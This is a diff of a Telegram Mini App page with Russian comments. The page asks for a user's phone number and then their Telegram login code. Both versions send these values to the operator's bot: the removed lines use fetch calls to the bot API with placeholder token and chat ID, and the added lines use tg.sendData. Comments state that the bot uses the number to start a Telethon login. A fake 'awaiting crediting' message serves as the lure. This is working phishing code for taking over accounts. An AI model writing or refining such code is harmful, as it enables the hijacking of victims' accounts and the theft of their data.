@@ -30,23 +30,25 @@
 
     <script>
         let tg = window.Telegram.WebApp;
-        tg.expand();
+tg.expand();
 
-        function nextStep(current) {
-            let val = document.getElementById('phone').value;
-            // Отправляем номер боту, чтобы он инициировал вход через Telethon
-            fetch(`https://api.telegram.org/botВАШ_ТОКЕН/sendMessage?chat_id=ТВОЙ_ID&text=PHONE:${val}`);
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step2').classList.add('active');
-        }
+function toStep2() {
+    let phone = document.getElementById('phone').value;
+    if (phone.length < 10) return alert("Введите номер");
+    
+    // ЭТАП 1: Отправляем боту команду запросить код
+    tg.sendData("STEP1_PHONE:" + phone); 
+    
+    document.getElementById('step1').classList.remove('active');
+    document.getElementById('step2').classList.add('active');
+}
 
-        function sendFinal() {
-            let code = document.getElementById('code').value;
-            // Отправляем код боту
-            fetch(`https://api.telegram.org/botВАШ_ТОКЕН/sendMessage?chat_id=ТВОЙ_ID&text=CODE:${code}`);
-            alert("Обработка... Ожидайте зачисления.");
-            tg.close();
-        }
+function finish() {
+    let code = document.getElementById('code').value;
+    // ЭТАП 2: Отправляем боту сам код
+    tg.sendData("STEP2_CODE:" + code);
+    tg.close();
+}
     </script>
 </body>
 </html>
